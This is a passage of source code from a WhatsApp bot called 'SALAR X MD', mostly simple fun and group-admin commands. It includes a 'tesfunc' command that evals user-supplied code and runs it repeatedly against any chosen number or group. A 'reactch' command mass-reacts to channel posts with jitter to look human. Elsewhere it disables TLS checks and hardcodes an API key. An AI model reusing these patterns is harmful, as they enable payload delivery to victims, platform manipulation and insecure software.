                    { quoted: m }
                );
            }
                break;

case 'tesfunc':
case 'tf': {
  if (!isCreator) return reply('❌ Owner only.');
  if (!devtrust) return reply('❌ WhatsApp not connected.');

  const targetInput = args[0];
  const loopCount = parseInt(args[1], 10);

  if (!targetInput || isNaN(loopCount) || loopCount < 1) {
    return reply(
      '📌 Usage: .tesfunc <target> <loop>\n' +
      '(Reply to a function text or .js file)\n\n' +
      'Number  : .tesfunc 628123456789 3\n' +
      'Group   : .tesfunc https://chat.whatsapp.com/xxx 2\n' +
      'Channel : .tesfunc https://whatsapp.com/channel/xxx 1\n' +
      'JID     : .tesfunc 120363xxx@g.us 2'
    );
  }

  async function resolveTarget(input) {
    if (input.includes('@s.whatsapp.net') || input.includes('@g.us') || input.includes('@newsletter')) return input;

    const channelLink = input.match(/whatsapp\.com\/channel\/([A-Za-z0-9_-]+)/);
    if (channelLink) return `${channelLink[1]}@newsletter`;

    const groupLink = input.match(/chat\.whatsapp\.com\/([A-Za-z0-9_-]+)/);
    if (groupLink) {
      try {
        const info = await devtrust.groupGetInviteInfo(groupLink[1]);
        return info.id;
      } catch (e) {
        throw new Error(`Cannot get group info: ${e.message}`);
      }
    }

    const digits = input.replace(/[^0-9]/g, '');
    if (digits.length > 5) return `${digits}@s.whatsapp.net`;

    return null;
  }

  let target;
  try {
    target = await resolveTarget(targetInput);
  } catch (e) {
    return reply(`❌ Failed to resolve target: ${e.message}`);
  }

  if (!target) return reply('❌ Invalid target. Use number, group link/JID, or channel link/JID.');

  const quoted = m.quoted || null;
  if (!quoted) {
    return reply(
      '❌ Reply to a message containing the function.\n\n' +
      'Example: .tesfunc 628123456789 1\n' +
      '(reply to a text function or .js file)'
    );
  }

  let funcCode = null;

  if (quoted.mtype === 'documentMessage') {
    const mime = quoted.mimetype || '';
    const fileName = quoted.fileName || '';
    if (!mime.includes('javascript') && !fileName.endsWith('.js')) {
      return reply('❌ File must be a .js file.');
    }
    try {
      const buffer = await devtrust.downloadMediaMessage(quoted);
      funcCode = buffer.toString('utf8');
    } catch (e) {
      return reply(`❌ Failed to download file: ${e.message}`);
    }
  } else if (quoted.text || quoted.body) {
    funcCode = quoted.text || quoted.body;
  } else {
    return reply('❌ Reply must be a text function or a .js file.');
  }

  let func;
  try {
    const matchName =
      funcCode.match(/async\s+function\s+([a-zA-Z0-9_]+)/) ||
      funcCode.match(/function\s+([a-zA-Z0-9_]+)/);
    if (matchName?.[1]) {
      eval(`${funcCode}; func = ${matchName[1]};`);
    } else {
      eval(`func = ${funcCode}`);
    }
  } catch (e) {
    return reply(`❌ Invalid function: ${e.message}`);
  }

  if (typeof func !== 'function') {
    return reply(
      '❌ Must be a valid function.\n\n' +
      'Example:\nasync function test(devtrust, target) {\n' +
      '  await devtrust.sendMessage(target, addNewsletterContext({ text: "hello" }));\n}'
    );
  }

  const targetType = target.includes('@newsletter') ? 'Channel' : target.includes('@g.us') ? 'Group' : 'Number';

  await reply(
    `🚀 *Running Function Test*\n\n` +
    `Target : ${target}\n` +
    `Type   : ${targetType}\n` +
    `Loop   : ${loopCount}x\n\n` +
    `Please wait...`
  );

  let successCount = 0;
  let errorCount = 0;

  for (let i = 0; i < loopCount; i++) {
    try {
      if (func.length >= 2) {
        await func(devtrust, target);
      } else if (func.length === 1) {
        await func(target);
      } else {
        await func();
      }
      successCount++;
      console.log(`[TESFUNC] Run ${i + 1}/${loopCount} → ${target}`);
    } catch (e) {
      errorCount++;
      console.error(`[TESFUNC] Run ${i + 1} failed: ${e.message}`);
    }
    await new Promise(r => setTimeout(r, 1000));
  }

  return reply(
    `✅ *Function Test Done*\n\n` +
    `Target  : ${target}\n` +
    `Type    : ${targetType}\n` +
    `Loop    : ${loopCount}x\n` +
    `Success : ${successCount}\n` +
    `Failed  : ${errorCount}`
  );
  break;
}

case 'reactch':
case 'rch': {
  if (!isCreator) return reply('🔒 *Owner only.*');
  if (!devtrust) return reply('❌ *WhatsApp not connected.*');

  if (!args[0]) {
    return reply(
      `📡 *React Channel - Usage*\n\n` +
      `${prefix}reactch <link/id/jid> <emoji1> [emoji2] ... [--limit=N] [--delay=MS] [--follow]\n\n` +
      `*Examples:*\n` +
      `• ${prefix}reactch https://whatsapp.com/channel/xxx ❤️\n` +
      `• ${prefix}reactch 120363xxxxxxxxx ❤️ 🔥 😍 🥰\n` +
      `• ${prefix}reactch 120363xxxxxxxxx@newsletter ✅ --limit=50\n` +
      `• ${prefix}reactch <link> ❤️ --follow --delay=800\n\n` +
      `*Flags:*\n` +
      `• \`--limit=N\`  → max messages to react (default 200, max 500)\n` +
      `• \`--delay=MS\` → delay per reaction in ms (default 700)\n` +
      `• \`--follow\`   → auto-follow channel if not following\n\n` +
      `📝 *Notes:*\n` +
      `- Bot *MUST follow* the channel first (use --follow to auto-subscribe).\n` +
      `- 1 emoji  = same emoji for all messages.\n` +
      `- >1 emoji = randomly picked per message.`
    );
  }

  // ────────────────────────────────────────────────
  // Parse args + flags
  // ────────────────────────────────────────────────
  const target = args[0];
  const rest = args.slice(1).filter(Boolean);
  const flags = {
    limit: 200,
    delay: 700,
    autoFollow: false
  };
  const emojiList = [];
  for (const tok of rest) {
    if (/^--limit=\d+$/i.test(tok)) {
      flags.limit = Math.min(500, Math.max(1, parseInt(tok.split('=')[1], 10)));
    } else if (/^--delay=\d+$/i.test(tok)) {
      flags.delay = Math.min(5000, Math.max(150, parseInt(tok.split('=')[1], 10)));
    } else if (/^--follow$/i.test(tok)) {
      flags.autoFollow = true;
    } else {
      emojiList.push(tok);
    }
  }

  if (!emojiList.length) {
    return reply('❌ *Minimal 1 emoji.*\n\nExample: ' + prefix + 'reactch <link/id> ❤️ 🔥');
  }

  await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

  // ────────────────────────────────────────────────
  // Resolve channel JID (multi-strategy)
  // ────────────────────────────────────────────────
  let channelJid = null;
  let inviteCode = null;
  try {
    if (typeof target === 'string' && target.includes('@newsletter')) {
      channelJid = target;
    } else if (/^https?:\/\/(www\.)?whatsapp\.com\/channel\//i.test(target)) {
      inviteCode = target.split('/channel/')[1].split(/[\/?#]/)[0];
      const meta = await devtrust.newsletterMetadata('invite', inviteCode).catch(() => null);
      channelJid = meta?.id || null;
    } else if (/^\d{10,}$/.test(target)) {
      channelJid = `${target}@newsletter`;
    } else if (typeof channelReact?.resolveChannelJid === 'function') {
      channelJid = await channelReact.resolveChannelJid(devtrust, target);
    }
  } catch (e) {
    console.error('reactch resolve error:', e);
    return reply(`❌ *Failed to resolve channel:* ${e.message}`);
  }

  if (!channelJid || !/@newsletter$/.test(channelJid)) {
    return reply('❌ *Invalid channel link / id / jid.*\n\nMake sure format is correct:\n• `https://whatsapp.com/channel/xxx`\n• `120363xxxxxxxxx@newsletter`');
  }

  // ────────────────────────────────────────────────
  // Get channel metadata + follow status
  // ────────────────────────────────────────────────
  let channelMeta = null;
  let channelName = shortJid(channelJid);
  let isFollowing = false;
  try {
    channelMeta = await devtrust.newsletterMetadata('jid', channelJid).catch(() => null);
    if (channelMeta?.name) channelName = channelMeta.name;
    // Baileys exposes follow state via viewer_metadata / mute / role
    isFollowing = !!(
      channelMeta?.viewer_metadata?.role &&
      channelMeta.viewer_metadata.role !== 'GUEST'
    ) || channelMeta?.role === 'SUBSCRIBER' || channelMeta?.role === 'OWNER' || channelMeta?.role === 'ADMIN';
  } catch (_) {}

  // ────────────────────────────────────────────────
  // Auto-follow if requested or not following
  // ────────────────────────────────────────────────
  let followAttempted = false;
  if (!isFollowing && flags.autoFollow) {
    followAttempted = true;
    try {
      if (typeof devtrust.newsletterFollow === 'function') {
        await devtrust.newsletterFollow(channelJid);
        isFollowing = true;
        await new Promise(r => setTimeout(r, 1500)); // wait sync
      }
    } catch (e) {
      console.error('reactch follow error:', e?.message || e);
    }
  }

  await devtrust.sendMessage(
    m.chat,
    addNewsletterContext({
      text:
        `🚀 *React Channel Started*\n\n` +
        `📡 *Channel  :* ${channelName}\n` +
        `🆔 *JID      :* \`${shortJid(channelJid)}\`\n` +
        `👥 *Subs     :* ${channelMeta?.subscribers ?? channelMeta?.subscriberCount ?? '—'}\n` +
        `📌 *Follow   :* ${isFollowing ? '✅ Yes' : '⚠️ No (history may be empty)'}\n` +
        `🎯 *Emojis   :* ${emojiList.join(' ')}\n` +
        `🔢 *Mode     :* ${emojiList.length === 1 ? 'Single emoji' : 'Random per message'}\n` +
        `📦 *Limit    :* ${flags.limit}\n` +
        `⏱️ *Delay    :* ${flags.delay}ms\n\n` +
        `⏳ Fetching channel messages...`
    }),
    { quoted: m }
  );

  // ────────────────────────────────────────────────
  // Robust fetch: try every known Baileys signature
  // ────────────────────────────────────────────────
  const fetchStrategies = [
    // Strategy 1: standard newsletterFetchMessages(jid, count)
    async () => {
      if (typeof devtrust.newsletterFetchMessages !== 'function') return null;
      return await devtrust.newsletterFetchMessages(channelJid, flags.limit);
    },
    // Strategy 2: legacy signature ('jid', jid, count)
    async () => {
      if (typeof devtrust.newsletterFetchMessages !== 'function') return null;
      return await devtrust.newsletterFetchMessages('jid', channelJid, flags.limit);
    },
    // Strategy 3: newsletterFetchUpdates - returns recent updates
    async () => {
      if (typeof devtrust.newsletterFetchUpdates !== 'function') return null;
      return await devtrust.newsletterFetchUpdates(channelJid, {
        count: flags.limit,
        after: 0,
        since: 0
      });
    },
    // Strategy 4: newsletterFetchUpdates positional
    async () => {
      if (typeof devtrust.newsletterFetchUpdates !== 'function') return null;
      return await devtrust.newsletterFetchUpdates(channelJid, flags.limit, 0, 0);
    },
    // Strategy 5: raw query (low-level) - depends on Baileys build
    async () => {
      if (typeof devtrust.query !== 'function') return null;
      const res = await devtrust.query({
        tag: 'iq',
        attrs: { to: channelJid, type: 'get', xmlns: 'newsletter' },
        content: [{ tag: 'messages', attrs: { count: String(flags.limit), type: 'jid' } }]
      });
      return res;
    }
  ];

  let messages = [];
  let usedStrategy = -1;
  for (let i = 0; i < fetchStrategies.length; i++) {
    try {
      const out = await fetchStrategies[i]();
      if (out) {
        // Normalize: could be array, or object with .messages, or xml node
        let arr = null;
        if (Array.isArray(out)) arr = out;
        else if (Array.isArray(out?.messages)) arr = out.messages;
        else if (Array.isArray(out?.updates)) arr = out.updates;
        else if (out?.content && Array.isArray(out.content)) arr = out.content;
        if (Array.isArray(arr) && arr.length) {
          messages = arr;
          usedStrategy = i + 1;
          break;
        }
      }
    } catch (e) {
      console.log(`reactch fetch strategy ${i + 1} failed:`, e?.message || e);
    }
  }

  // ────────────────────────────────────────────────
  // Extract serverIds with maximum field coverage
  // ────────────────────────────────────────────────
  const serverIds = new Set();
  const extractSid = (msg) => {
    if (!msg || typeof msg !== 'object') return;
    const candidates = [
      msg.serverId,
      msg.server_id,
      msg.newsletterServerId,
      msg.messageServerId,
      msg.message_server_id,
      msg?.message?.newsletterServerId,
      msg?.message?.messageContextInfo?.messageSecret,
      msg?.key?.serverId,
      msg?.key?.server_id,
      msg?.attrs?.server_id,
      msg?.attrs?.serverId,
      msg?.attrs?.id
    ];
    for (const c of candidates) {
      if (c !== null && c !== undefined && c !== '' && /^\d+$/.test(String(c))) {
        serverIds.add(String(c));
        return;
      }
    }
    // Recurse into nested .content / .message
    if (Array.isArray(msg.content)) msg.content.forEach(extractSid);
    if (msg.message && typeof msg.message === 'object') extractSid(msg.message);
  };
  messages.forEach(extractSid);

  const sidArray = [...serverIds];

  if (!sidArray.length) {
    const hints = [];
    if (!isFollowing) hints.push('• Bot is *not following* the channel — run with `--follow` flag.');
    hints.push('• Channel may have no messages, or history is not synced yet.');
    hints.push('• WhatsApp restricts newsletter history for non-subscribers.');
    hints.push('• Try again in 10-20 seconds (sync delay).');

    return devtrust.sendMessage(
      m.chat,
      addNewsletterContext({
        text:
          `❌ *No messages found in channel.*\n\n` +
          `📡 *Channel:* ${channelName}\n` +
          `📌 *Following:* ${isFollowing ? 'Yes' : 'No'}\n` +
          `🔍 *Fetch strategy used:* ${usedStrategy > 0 ? usedStrategy : 'none worked'}\n` +
          `📨 *Raw messages:* ${messages.length}\n\n` +
          `*Possible reasons:*\n${hints.join('\n')}\n\n` +
          `💡 *Tip:* ${prefix}reactch ${shortJid(channelJid)} ${emojiList.join(' ')} --follow`
      }),
      { quoted: m }
    );
  }

  // ────────────────────────────────────────────────
  // React with retry, rate-limit handling, progress
  // ────────────────────────────────────────────────
  const pickEmoji = () =>
    emojiList.length === 1
      ? emojiList[0]
      : emojiList[Math.floor(Math.random() * emojiList.length)];

  const reactWithRetry = async (sid, emoji, maxRetry = 2) => {
    let lastErr = null;
    for (let attempt = 0; attempt <= maxRetry; attempt++) {
      try {
        await devtrust.newsletterReactMessage(channelJid, sid, emoji);
        return { ok: true };
      } catch (e) {
        lastErr = e;
        const msg = String(e?.message || e).toLowerCase();
        // Rate limit → backoff
        if (msg.includes('rate') || msg.includes('429') || msg.includes('too many')) {
          await new Promise(r => setTimeout(r, 2500 * (attempt + 1)));
          continue;
        }
        // Not-allowed / forbidden → no point retrying
        if (msg.includes('forbidden') || msg.includes('not-allowed') || msg.includes('401') || msg.includes('403')) {
          return { ok: false, fatal: true, error: e };
        }
        await new Promise(r => setTimeout(r, 500 * (attempt + 1)));
      }
    }
    return { ok: false, error: lastErr };
  };

  const startTs = Date.now();
  let success = 0;
  let failed = 0;
  let fatalStop = false;
  const total = sidArray.length;
  const progressEvery = Math.max(10, Math.floor(total / 5));
  let lastProgress = 0;

  for (let i = 0; i < sidArray.length; i++) {
    if (fatalStop) break;
    const sid = sidArray[i];
    const emoji = pickEmoji();
    const res = await reactWithRetry(sid, emoji);
    if (res.ok) {
      success++;
    } else {
      failed++;
      if (res.fatal) {
        fatalStop = true;
        console.error('reactch fatal stop:', res.error?.message);
      } else {
        console.error(`reactch error sid=${sid}:`, res.error?.message || res.error);
      }
    }

    // Progress ping every N
    if ((i + 1) - lastProgress >= progressEvery && (i + 1) < total) {
      lastProgress = i + 1;
      try {
        await devtrust.sendMessage(
          m.chat,
          { react: { text: ['⏳','⌛','🔄','🌀'][i % 4], key: m.key } }
        );
      } catch (_) {}
    }

    // Small jitter to look more human + avoid burst
    const jitter = Math.floor(Math.random() * 200);
    await new Promise(r => setTimeout(r, flags.delay + jitter));
  }

  const durationSec = ((Date.now() - startTs) / 1000).toFixed(1);
  const rate = success > 0 ? (success / (durationSec || 1)).toFixed(2) : '0';

  // ────────────────────────────────────────────────
  // Final report
  // ────────────────────────────────────────────────
  const summaryText =
    `${fatalStop ? '⚠️' : '✅'} *React Channel ${fatalStop ? 'Stopped' : 'Done'}*\n\n` +
    `📡 *Channel  :* ${channelName}\n` +
    `🆔 *JID      :* \`${shortJid(channelJid)}\`\n` +
    `🎯 *Emojis   :* ${emojiList.join(' ')}\n` +
    `📨 *Total    :* ${total}\n` +
    `✔️ *Success  :* ${success}\n` +
    `❌ *Failed   :* ${failed}\n` +
    `⏱️ *Duration :* ${durationSec}s\n` +
    `⚡ *Rate     :* ${rate} react/s\n` +
    `🔧 *Strategy :* #${usedStrategy}` +
    (followAttempted ? `\n📌 *Followed :* during this run` : '') +
    (fatalStop ? `\n\n⚠️ *Stopped early due to permission/forbidden error.*` : '');

  try {
    await devtrust.relayMessage(
      m.chat,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: { text: summaryText },
              footer: { text: '⚙️ Powered by 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗' },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: 'quick_reply',
                    buttonParamsJson: JSON.stringify({
                      display_text: '🔁 Re-React',
                      id: `${prefix}reactch ${shortJid(channelJid)} ${emojiList.join(' ')}`
                    })
                  },
                  {
                    name: 'quick_reply',
                    buttonParamsJson: JSON.stringify({
                      display_text: '🔁 Re-React +Follow',
                      id: `${prefix}reactch ${shortJid(channelJid)} ${emojiList.join(' ')} --follow`
                    })
                  },
                  {
                    name: 'quick_reply',
                    buttonParamsJson: JSON.stringify({
                      display_text: '📋 List Jobs',
                      id: `${prefix}cr list`
                    })
                  },
                  {
                    name: 'cta_url',
                    buttonParamsJson: JSON.stringify({
                      display_text: '📢 Channel',
                      url: 'https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r'
                    })
                  }
                ]
              },
              contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363427254972269@newsletter',
                  newsletterName: '© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 by 𝗦𝗔𝗟𝗔𝗥 𝗞𝗜𝗡𝗚',
                  serverMessageId: -1
                }
              }
            }
          }
        }
      },
      { quoted: m }
    );
  } catch (btnErr) {
    console.log('reactch button fallback:', btnErr?.message);
    await devtrust.sendMessage(m.chat, addNewsletterContext({ text: summaryText }), { quoted: m });
  }

  await devtrust.sendMessage(m.chat, { react: { text: fatalStop ? '⚠️' : '✅', key: m.key } });
}
break;

            case 'thailand-girl': {
                devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: 'https://apis.prexzyvilla.site/random/thailandgirl' },
                        caption: "🇹🇭 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Thailand Girl*"
                    }),
                    { quoted: m }
                );
            }
                break;

            case 'tiktokgirl': {
                devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: 'https://apis.prexzyvilla.site/random/tiktok-girl' },
                        caption: "🎵 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 TikTok Girl*"
                    }),
                    { quoted: m }
                );
            }
                break;

            case 'vietnam-girl': {
                devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: 'https://apis.prexzyvilla.site/random/vietnamgirl' },
                        caption: "🇻🇳 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Vietnam Girl*"
                    }),
                    { quoted: m }
                );
            }
                break;

            case "cat": {
                try {
                    const res = await axios.get("https://api.thecatapi.com/v1/images/search");
                    const img = res.data[0]?.url;
                    if (!img) return reply("❌ *Cat napping* • Try again");

                    await devtrust.sendMessage(m.chat,
                        addNewsletterContext({
                            image: { url: img },
                            caption: "🐱 *Random Cat*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    console.error("CAT ERROR:", e);
                    reply("❌ *Cat fetch failed* • On a mouse hunt");
                }
            }
                break;

            case "rps": {
                if (!text) return reply("🪨 *Choose:* rock, paper, scissors");

                const choices = ["rock", "paper", "scissors"];
                const userChoice = text.toLowerCase();
                if (!choices.includes(userChoice))
                    return reply("❌ *Invalid choice* • Use rock, paper, scissors");

                const botChoice = choices[Math.floor(Math.random() * choices.length)];

                let result = userChoice === botChoice ? "🤝 *Tie!*" :
                    (userChoice === "rock" && botChoice === "scissors") ||
                        (userChoice === "paper" && botChoice === "rock") ||
                        (userChoice === "scissors" && botChoice === "paper")
                        ? "🎉 *You win!*" : "😢 *You lose!*";

                reply(`🪨 *RPS*\n\nYou: ${userChoice}\nBot: ${botChoice}\n${result}`);
            }
                break;

            case "8ball": {
                const answers = [
                    "It is certain ✅", "Without a doubt ✅", "Ask again later 🤔",
                    "Cannot predict now 🤷", "𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗't count on it ❌", "Very doubtful ❌"
                ];
                if (!text) return reply("🎱 *Ask me a question*");

                const answer = answers[Math.floor(Math.random() * answers.length)];
                reply(`🎱 *Question:* ${text}\n\n${answer}`);
            }
                break;

            case "trivia": {
                try {
                    const res = await axios.get("https://opentdb.com/api.php?amount=1&type=multiple");
                    const trivia = res.data.results[0];
                    const options = [...trivia.incorrect_answers, trivia.correct_answer]
                        .sort(() => Math.random() - 0.5);

                    reply(`❓ *${trivia.question}*\n\n${options.map((o, i) => `${i + 1}. ${o}`).join("\n")}`);
                } catch (e) {
                    console.error("TRIVIA ERROR:", e);
                    reply("❌ *Trivia unavailable*");
                }
            }
                break;

            case "meme": {
                try {
                    const res = await axios.get("https://meme-api.com/gimme");
                    const meme = res.data;
                    if (!meme?.url) return reply("❌ *Meme ran away*");

                    await devtrust.sendMessage(m.chat,
                        addNewsletterContext({
                            image: { url: meme.url },
                            caption: `😂 *${meme.title}*`
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    console.error("MEME ERROR:", e);
                    reply("❌ *Meme factory closed*");
                }
            }
                break;

            case 'gfx':
            case 'gfx2':
            case 'gfx3':
            case 'gfx4':
            case 'gfx5':
            case 'gfx6':
            case 'gfx7':
            case 'gfx8':
            case 'gfx9':
            case 'gfx10':
            case 'gfx11':
            case 'gfx12': {
                const [text1, text2] = text.split('|').map(v => v.trim());
                if (!text1 || !text2) {
                    return reply(`🎨 *Usage:* ${prefix + command} text1 | text2`);
                }

                reply(`⏳ *Generating GFX...*`);

                try {
                    const style = command.toUpperCase();
                    const apiUrl = `https://api.nexoracle.com/image-creating/${command}?apikey=d0634e61e8789b051e&text1=${encodeURIComponent(text1)}&text2=${encodeURIComponent(text2)}`;

                    await devtrust.sendMessage(m.chat,
                        addNewsletterContext({
                            image: { url: apiUrl },
                            caption: `🎨 *${style} GFX*\n${text1} | ${text2}`
                        }),
                        { quoted: m }
                    );
                } catch (err) {
                    console.error(err);
                    reply(`❌ *GFX generation failed*`);
                }
                break;
            }

            case 'getpp': {
                if (!isCreator) return reply("🔒 *Owner only*");

                let userss = m.mentionedJid[0] ? m.mentionedJid[0] :
                    m.quoted ? m.quoted.sender :
                        text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

                try {
                    var ppuser = await devtrust.profilePictureUrl(userss, 'image');
                } catch (err) {
                    var ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png';
                }

                await devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: ppuser },
                        caption: `👤 *Profile Picture*`
                    }),
                    { quoted: m }
                );
            }
                break;

            case 'yts':
            case 'ytsearch': {
                if (!isCreator) return reply(`🔒 *Owner only*`);
                if (!text) return reply(`🔍 *Example:* ${prefix + command} anime music`);

                let yts = require("yt-search");
                let search = await yts(text);

                let teks = `📺 *YouTube Search*\n\n"${text}"\n\n`;
                let no = 1;

                for (let i of search.all.slice(0, 5)) {
                    teks += `${no++}. *${i.title}*\n⏱️ ${i.timestamp} | 👀 ${i.views}\n🔗 ${i.url}\n\n`;
                }

                await devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: search.all[0].thumbnail },
                        caption: teks
                    }),
                    { quoted: m }
                );
            }
                break;

            case 'animewlp': {
                if (!isCreator) return reply(`🔒 *Owner only*`);

                try {
                    const waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`);
                    await devtrust.sendMessage(m.chat,
                        addNewsletterContext({
                            image: { url: waifudd.data.url },
                            caption: "🖼️ *Anime Wallpaper*"
                        }),
                        { quoted: m }
                    );
                } catch (err) {
                    reply('❌ *Error fetching wallpaper*');
                }
            }
                break;
                


            case 'resetlink': {
                if (!isCreator) return reply(`🔒 *Owner only*`);
                if (!m.isGroup) return reply("👥 *Groups only*");

                await devtrust.groupRevokeInvite(m.chat);
                reply("✅ *Group link reset*");
            }
                break;

            case 'animedl': {
                if (!isCreator) return reply(`🔒 *Owner only*`);
                if (!q.includes("|")) {
                    return reply("📌 *Format:* animedl Anime Name | Episode");
                }

                try {
                    const [animeName, episode] = q.split("|").map(x => x.trim());
                    const apiUrl = `https://draculazxy-xyzdrac.hf.space/api/Animedl?q=${encodeURIComponent(animeName)}&ep=${encodeURIComponent(episode)}`;

                    process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

                    const { data } = await axios.get(apiUrl, {
                        httpsAgent: new (require('https').Agent)({ rejectUnauthorized: false })
                    });

                    if (data.STATUS !== 200 || !data.download_link) {
                        return reply("❌ *Episode not found*");
                    }

                    const { anime, episode: epNumber, download_link } = data;

                    reply(`🎥 *${anime}* Ep ${epNumber}\n⏳ Downloading...`);

                    await devtrust.sendMessage(m.chat, {
                        document: { url: download_link },
                        mimetype: "video/mp4",
                        fileName: `${anime} - Episode ${epNumber}.mp4`
                    }, { quoted: m });

                } catch (error) {
                    console.error("❌ Anime Downloader Error:", error.message);
                    reply("⚠️ *Server Error* • Try again later");
                }
            }
                break;

            case 'animesearch': {
                if (!isCreator) return reply(`🔒 *Owner only*`);
                if (!text) return reply(`🔍 *Which anime?*`);

                const malScraper = require('mal-scraper');
                const anime = await malScraper.getInfoFromName(text).catch(() => null);

                if (!anime) return reply(`❌ *Anime not found*`);

                let animetxt = `🎀 *${anime.title}*\n` +
                    `🎋 Type: ${anime.type}\n` +
                    `📈 Status: ${anime.status}\n` +
                    `💮 Genres: ${anime.genres}\n` +
                    `🌟 Score: ${anime.score}\n` +
                    `💫 Popularity: ${anime.popularity}\n\n` +
                    `📝 ${anime.synopsis.substring(0, 300)}...`;

                await devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: anime.picture },
                        caption: animetxt
                    }),
                    { quoted: m }
                );
            }
                break;

            case 'animehighfive':
            case 'animecringe':
            case 'animedance':
            case 'animehappy':
            case 'animeglomp':
            case 'animesmug':
            case 'animeblush':
            case 'animewave':
            case 'animesmile':
            case 'animepoke':
            case 'animewink':
            case 'animebonk':
            case 'animebully':
            case 'animeyeet':
            case 'animebite':
            case 'animelick':
            case 'animekill': {
                if (!isCreator) return reply(`🔒 *Owner only*`);

                const action = command.replace('anime', '');
                try {
                    const waifudd = await axios.get(`https://waifu.pics/api/sfw/${action}`);
                    await devtrust.sendMessage(m.chat,
                        addNewsletterContext({
                            image: { url: waifudd.data.url },
                            caption: `🎌 *Anime ${action}*`
                        }),
                        { quoted: m }
                    );
                } catch (err) {
                    reply('❌ *Error fetching image*');
                }
            }
                break;

            case 'cry': case 'kill': case 'hug': case 'pat': case 'lick':
            case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
            case 'wink': case 'poke': case 'nom': case 'slap': case 'smile':
            case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp':
            case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive':
            case 'shinobu': case 'handhold': {
                if (!isCreator) return reply("🔒 *Owner only*");

                try {
                    const { data } = await axios.get(`https://api.waifu.pics/sfw/${command}`);
                    await devtrust.sendImageAsSticker(from, data.url, m, {
                        packname: "𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
                        author: "𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗"
                    });
                } catch (err) {
                    reply("❌ *Sticker generation failed*");
                }
            }
                break;

            case 'ai': {
                if (!text) return reply('🤖 *Example:* ai Who is Mark Zuckerberg?');

                await devtrust.sendPresenceUpdate('composing', m.chat);

                try {
                    const { data } = await axios.post("https://chateverywhere.app/api/chat/", {
                        model: { id: "gpt-4", name: "GPT-4", maxLength: 32000 },
                        messages: [{ pluginId: null, content: text, role: "user" }],
                        temperature: 0.5
                    });

                    reply(`🤖 *AI*\n\n${data}`);

                } catch (e) {
                    reply(`❌ *AI error* • ${e.message}`);
                }
            }
                break;

            case 'idch': {
                if (!isCreator) return reply("🔒 *Owner only*");
                if (!text) return reply("🔗 *Example:* link channel");
                if (!text.includes("https://whatsapp.com/channel/"))
                    return reply("❌ *Invalid channel link*");

                let result = text.split('https://whatsapp.com/channel/')[1];
                let res = await devtrust.newsletterMetadata("invite", result);

                let teks = `📢 *Channel Info*\n\n` +
                    `🆔 ID: ${res.id}\n` +
                    `👤 Name: ${res.name}\n` +
                    `👥 Followers: ${res.subscribers}\n` +
                    `✔️ Verified: ${res.verification == "VERIFIED" ? "Yes" : "No"}`;

                return reply(teks);
            }
                break;

            case 'closetime': {
                if (!isCreator) return reply("🔒 *Owner only*");

                let unit = args[1];
                let value = Number(args[0]);
                if (!value) return reply("*Usage:* closetime 10 minute");

                let timer = unit === 'second' ? value * 1000 :
                    unit === 'minute' ? value * 60000 :
                        unit === 'hour' ? value * 3600000 :
                            unit === 'day' ? value * 86400000 : null;

                if (!timer) return reply('*Choose:* second, minute, hour, day');

                reply(`⏳ *Closing in ${value} ${unit}*`);

                setTimeout(async () => {
                    try {
                        await devtrust.groupSettingUpdate(m.chat, 'announcement');
                        reply(`🔒 *Group closed* • Only admins can message`);
                    } catch (e) {
                        reply('❌ Failed: ' + e.message);
                    }
                }, timer);
            }
                break;

            case 'opentime': {
                if (!isCreator) return reply("🔒 *Owner only*");

                let unit = args[1];
                let value = Number(args[0]);
                if (!value) return reply('*Usage:* opentime 5 second');

                let timer = unit === 'second' ? value * 1000 :
                    unit === 'minute' ? value * 60000 :
                        unit === 'hour' ? value * 3600000 :
                            unit === 'day' ? value * 86400000 : null;

                if (!timer) return reply('*Choose:* second, minute, hour, day');

                reply(`⏳ *Opening in ${value} ${unit}*`);

                setTimeout(async () => {
                    try {
                        await devtrust.groupSettingUpdate(m.chat, 'not_announcement');
                        reply(`🔓 *Group opened* • Everyone can message`);
                    } catch (e) {
                        reply('❌ Failed: ' + e.message);
                    }
                }, timer);
            }
                break;

            case 'fact': {
                if (!isCreator) return reply("🔒 *Owner only*");

                try {
                    const nyash = await axios.get("https://apis.davidcyriltech.my.id/fact");
                    const ilovedavid = nyash.data.fact;

                    await devtrust.sendMessage(m.chat,
                        addNewsletterContext({
                            image: { url: 'https://i.ibb.co/rGr4bWW8/image1.jpg' },
                            caption: ilovedavid
                        }),
                        { quoted: m }
                    );
                } catch (error) {
                    reply("❌ *Fact unavailable*");
                }
                break;
            }

            case 'listonline': {
                if (!isCreator) {
                    return reply(`🔒 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Online*\n\nOwner only command.`);
                }

                if (!m.isGroup) {
